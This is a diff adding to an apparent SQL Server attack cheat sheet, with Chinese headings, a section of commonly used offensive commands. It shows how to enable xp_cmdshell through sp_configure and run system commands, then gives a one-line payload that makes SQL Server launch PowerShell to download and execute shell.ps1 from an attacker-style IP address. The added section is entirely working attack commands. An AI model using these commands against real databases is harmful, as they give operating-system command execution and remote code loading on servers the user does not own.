@@ -56,3 +56,23 @@ SQL Server Payload
 - FILE_NAME()
 - TYPE_NAME()
 - COL_NAME()
+
+常用功能
+----------------------------------------
+- 开启cmdshell:
+
+::
+
+    EXEC sp_configure 'Show Advanced Options', 1;
+    reconfigure;
+    sp_configure;
+    EXEC sp_configure 'xp_cmdshell', 1
+    reconfigure;
+    xp_cmdshell "whoami" 
+
+
+- 下载并执行文件：
+
+::
+
+    xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.32/shell.ps1\");" 
